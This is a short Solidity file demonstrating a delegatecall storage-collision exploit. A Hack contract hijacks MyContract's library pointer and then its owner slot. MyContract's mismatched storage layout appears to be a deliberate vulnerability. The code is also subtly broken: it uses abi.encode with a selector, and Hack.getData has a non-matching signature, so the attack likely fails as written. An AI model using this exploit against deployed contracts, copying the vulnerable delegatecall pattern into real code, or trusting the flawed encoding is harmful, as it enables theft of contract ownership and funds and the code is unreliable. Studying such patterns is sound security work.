// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Hack {
    MyContract public goal;
    address public owner;

    constructor(address _address) {
        goal = MyContract(_address);
    }

    function attack() external payable {
        goal.delCallGetData(uint(uint160(address(this))));
        goal.delCallGetData(0);
    }

    function getData() external payable {
        owner = address(this);
    }
}

contract MyContract {
    address public secondContract;
    address public owner;
    uint public at;
    address public sender;
    uint public value;

    constructor(address _address) {
        owner = msg.sender;
        secondContract = _address;
    }

    function delCallGetData(uint timestamp) external payable {
        (bool success, ) = secondContract.delegatecall(
            abi.encode(AnotherContract.getData.selector, timestamp)
        );

        require(success, "failed");
    }
}

contract AnotherContract {
    uint public at;
    address public sender;
    uint public value;

    event Received(address, uint);

    function getData(uint timestamp) external payable {
        at = timestamp;
        sender = msg.sender;
        value = msg.value;
        emit Received(msg.sender, msg.value);
    }
}